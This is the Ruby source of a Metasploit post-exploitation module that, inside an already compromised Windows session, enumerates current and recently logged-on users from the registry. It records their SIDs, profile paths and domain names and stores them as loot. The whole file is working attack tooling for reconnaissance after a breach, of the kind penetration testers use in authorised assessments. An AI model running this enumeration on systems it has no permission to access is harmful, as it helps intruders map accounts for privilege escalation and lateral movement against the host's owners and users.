##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Logged On User Enumeration (Registry)',
        'Description' => %q{ This module will enumerate current and recently logged on Windows users. },
        'License' => MSF_LICENSE,
        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => %w[powershell shell meterpreter],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
            ]
          }
        }
      )
    )
    register_options([
      OptBool.new('CURRENT', [ true, 'Enumerate currently logged on users', true]),
      OptBool.new('RECENT', [ true, 'Enumerate recently logged on users', true])
    ])
  end

  def list_recently_logged_on_users
    tbl = Rex::Text::Table.new(
      'Header' => 'Recently Logged Users',
      'Indent' => 1,
      'Columns' =>
      [
        'SID',
        'Profile Path'
      ]
    )

    profiles = read_profile_list(user_accounts_only: false)

    return if profiles.blank?

    profiles.each do |profile|
      tbl << [
        profile['SID'],
        profile['PROF']
      ]
    end

    return if tbl.rows.empty?

    print_line("\n#{tbl}\n")
    p = store_loot('host.users.recent', 'text/plain', session, tbl.to_s, 'recent_users.txt', 'Recent Users')
    print_good("Results saved in: #{p}")
  end

  def list_currently_logged_on_users
    return unless session.type == 'meterpreter'

    tbl = Rex::Text::Table.new(
      'Header' => 'Current Logged Users',
      'Indent' => 1,
      'Columns' =>
      [
        'SID',
        'User'
      ]
    )
    keys = registry_enumkeys('HKU')

    return unless keys

    keys.each do |maybe_sid|
      next unless maybe_sid.starts_with?('S-1-5-21-')
      next if maybe_sid.ends_with?('_Classes')

      info = resolve_sid(maybe_sid)

      next if info.nil?

      name = info[:name]
      domain = info[:domain]

      next if domain.blank? || name.blank?

      tbl << [maybe_sid, "#{domain}\\#{name}"]
    end

    return if tbl.rows.empty?

    print_line("\n#{tbl}\n")
    p = store_loot('host.users.active', 'text/plain', session, tbl.to_s, 'active_users.txt', 'Active Users')
    print_good("Results saved in: #{p}")
  end

  def run
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    if datastore['CURRENT']
      if session.type == 'meterpreter'
        list_currently_logged_on_users
      else
        print_error("Incompatible session type '#{session.type}'. Can not retrieve list of currently logged in users.")
      end
    end

    if datastore['RECENT']
      list_recently_logged_on_users
    end
  end
end
